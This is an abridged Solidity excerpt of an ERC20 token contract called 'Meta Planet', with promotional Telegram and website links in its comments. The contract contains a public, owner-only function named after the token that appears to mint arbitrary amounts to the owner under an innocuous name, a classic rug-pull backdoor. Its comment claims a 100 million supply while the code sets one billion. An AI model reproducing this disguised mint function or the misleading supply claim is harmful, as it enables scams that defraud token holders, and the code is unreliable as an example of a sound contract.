...
//
// $MetaPlanet proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/MetaPlanett
// 📱Website :: http://metaplanetofficial.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _MetaPlanet(uint256 amount) public onlyOwner {
 _MetaPlanet(msg.sender, amount);
    }
    ...
    function _MetaPlanet(address account, uint256 amount) internal virtual {
...
contract $MetaPlanet is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Meta Planet", "MPLANET") {
     _MetaPlanet(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}